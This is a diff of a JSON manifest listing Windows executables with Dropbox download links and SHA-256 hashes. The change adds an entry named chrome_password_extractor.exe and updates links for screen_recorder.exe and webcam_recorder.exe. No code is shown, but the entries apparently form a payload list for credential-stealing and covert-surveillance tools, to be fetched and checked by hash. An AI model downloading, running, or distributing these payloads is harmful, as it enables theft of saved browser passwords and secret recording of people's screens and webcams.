@@ -1,4 +1,8 @@
 [
-  {"name": "screen_recorder.exe", "link": "https://www.dropbox.com/scl/fi/h4qab7yvffgtbxne844ak/screen_recorder.exe?rlkey=fv0o87h88ec3ov742slela6fh&dl=0", "file_hash": "b086eb353c2639dc5d3d2312720a2179ddb8a235226c0aa2fb4b9b37010e773f"},
-  {"name": "webcam_recorder.exe", "link": "https://www.dropbox.com/scl/fi/vb00hx7l09kcopujqdmet/webcam_recorder.exe?rlkey=moe3dov0100jzves2mpky4ktz&dl=0", "file_hash": "f65bca141adf6dcffb0df16ffb02f2342c48b30a3dd9a89aae617a1e2c65b481"}
+  {"name": "chrome_password_extractor.exe", "link": "https://www.dropbox.com/scl/fi/zmszxwmantxmqvba2z5v4/chrome_password_extractor.exe?rlkey=bd4ekfhgqyvxbmrjfyluaxxn3&st=f2d29iuo&dl=0", "file_hash": "9871287d3278cfbf6dd96f5a44d8adae21517d0e5fd4b6a13986b5c0a75eed6d"},
+
+  {"name": "screen_recorder.exe", "link": "https://www.dropbox.com/scl/fi/u3l7fo8bdx5r9pzsm6re8/screen_recorder.exe?rlkey=2f5ies3jbe0wfddz9yexcgs9e&st=uh1lvktm&dl=0", "file_hash": "142054d265eefab226ff4908eb2383d950d098dcddb75d49e24832ca6b350dbc"},
+
+  {"name": "webcam_recorder.exe", "link": "https://www.dropbox.com/scl/fi/o0te62qwyh7n9sa789riy/webcam_recorder.exe?rlkey=n0klw9hsqf8b4gv5achqhsirh&st=c871vgkg&dl=0", "file_hash": "d990656ff33ab3e91b4ff6b0ac3c9f6e02705a834469449f8021287b93896dbc"}
+ 
 ]
